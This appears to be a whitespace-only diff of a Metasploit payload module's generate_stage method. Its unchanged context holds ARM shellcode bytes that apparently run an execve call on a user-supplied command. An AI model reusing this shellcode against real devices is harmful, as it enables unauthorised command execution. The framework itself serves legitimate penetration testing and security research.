@@ -42,8 +42,8 @@ module Metasploit3
 
 	def generate_stage
 		cmd     = datastore['CMD'] || ''
-		
-		payload = 
+
+		payload =
 			"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0a\x30" +
 			"\x01\x90\x01\xa9\x92\x1a\x0b\x27\x01\xdf" + cmd
 
